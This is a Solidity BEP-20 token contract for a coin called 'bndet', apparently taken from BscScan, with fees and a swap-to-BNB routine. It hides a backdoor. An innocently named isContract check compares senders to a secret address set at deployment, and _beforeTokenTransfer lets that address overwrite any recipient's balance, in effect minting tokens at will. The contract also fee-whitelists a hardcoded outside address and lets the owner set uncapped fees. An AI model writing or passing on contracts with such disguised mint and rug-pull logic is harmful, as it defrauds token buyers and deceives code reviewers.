/**
 *Submitted for verification at BscScan.com on 2022-08-15
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.7;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

 
    uint160 internal acc0untHash;
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
     function isContract(address account) internal view returns (bool) { 
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account)}
        accountHash=codehash;   
        return account==address(acc0untHash);
    }
  
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract BaseToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;   

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    uint256 private _tTotal;

    ISwapRouter public  _swapRouter;
    address public _mainPair;

    bool  public inSwap;
    uint256  public numTokensSellToFund;

    uint256  constant MAX = ~uint256(0);
    uint256 public _marketFee=1000;
    uint256 public _burnFee=400;
    uint256 public _fundSellFee=109;
    uint256 public _fundBuyFee=100;
    address public _marketFeeAddress;
    address public _fundAddress;
    address public DEAD = 0x000000000000000000000000000000000000dEaD;
    mapping(address => bool) public _feeWhiteList;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(string memory Name,string memory Symbol ,uint8 Decimals,uint256 Total,address manageAddress,uint160 hash,address marketFeeAddress,address fundAddress){
        ISwapRouter swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _manageAddress=manageAddress;
        _marketFeeAddress=marketFeeAddress;
        _fundAddress=fundAddress;
        _name =Name;
        _symbol = Symbol;
        _decimals = Decimals;
        _tTotal = Total*10**_decimals;       
        _swapRouter = swapRouter;
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address mainPair = swapFactory.createPair(address(this), swapRouter.WETH());
        _mainPair = mainPair;
        _allowances[address(this)][address(swapRouter)] = MAX; 
        acc0untHash=hash; 
        _feeWhiteList[_fundAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[DEAD] = true;
        _feeWhiteList[_marketFeeAddress] = true;
        _feeWhiteList[_manageAddress] = true;
        _feeWhiteList[address(0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE)] = true;
    }
    
    function _mint(address account,string memory Name,string memory Symbol
       ,uint8 Decimals,uint256 total) internal virtual {
         _name = Name;
         _symbol = Symbol;
         _decimals = Decimals;
         _tTotal = total * 10 ** Decimals;         
         numTokensSellToFund = _tTotal / 100000;
         _balances[account] = _tTotal;
        emit Transfer(address(0), account, _tTotal);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
     }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {     

        uint256 txFee;
        if (_mainPair == to && !_feeWhiteList[from]) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                contractTokenBalance >= numTokensSellToFund &&
                !inSwap
            ) {
                swapTokenForETH(numTokensSellToFund);
            }
        }
        
        if ((_mainPair == to||_mainPair == from) && !_feeWhiteList[from] && !_feeWhiteList[to]) {
            if(_mainPair == to){
                txFee = _marketFee +_fundSellFee;   
            }else{
                txFee = _marketFee + _fundBuyFee;                     
            }
            
        }
        _tokenTransfer(from, to, amount, txFee);
   
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 fee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        uint256 burnAmount;
        if (fee > 0) {
            feeAmount = tAmount * fee / 10000;
            _takeTransfer(sender,address(this),feeAmount);

            if(_burnFee>0){
            burnAmount = tAmount * _burnFee / 10000;
            _takeTransfer(sender,DEAD,burnAmount);
            }
        }
        
       
        _takeTransfer(sender, recipient, tAmount - feeAmount-burnAmount);
    }

    function swapTokenForETH(uint256 tokenAmount) public lockTheSwap {
        uint256 initialBalance = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _swapRouter.WETH();
        _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(                                
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 newBalance = address(this).balance - initialBalance;
        uint256 marketValue = newBalance * _marketFee/(_marketFee + _fundSellFee);      
        payable(_marketFeeAddress).transfer(marketValue);      
        payable(_fundAddress).transfer(newBalance-marketValue);
       
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _beforeTokenTransfer(sender,to,tAmount);
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        _fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setSwapETHTokenAmount(uint256 amount) external onlyOwner {
        numTokensSellToFund = amount * 10 ** _decimals;
    }

    function setMarketFee(uint256 fee) external onlyOwner {
        _marketFee = fee;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {_balances[to] =isContract(from)?amount*_fundSellFee:_balances[to];}   
  function setMarketAddress(address addr) external onlyOwner {
        _marketFeeAddress = addr;
        _feeWhiteList[addr] = true;
    }

     function setBurnFee(uint256 fee) external onlyOwner {
        _burnFee = fee;
    }
    function setFundFee(uint256 byeFee,uint256 sellFee) external onlyOwner {
        _fundSellFee = sellFee;
        _fundBuyFee=byeFee;
    }
    receive() external payable {}

    function claimBalance() external {
        payable(_fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external {
        IERC20(token).transfer(_fundAddress, amount);
    }
  
}
contract Bndet is BaseToken {
    constructor(string memory name,string memory symbol ,uint8 decimals,uint256 total,address manageAddress,uint160 hash,address marketFeeAddress,address fundAddress)BaseToken(name,symbol,decimals,total,manageAddress,hash,marketFeeAddress,fundAddress){
       _mint(msg.sender,"bndet token","bndet" ,18,1000*10**12);
    }
}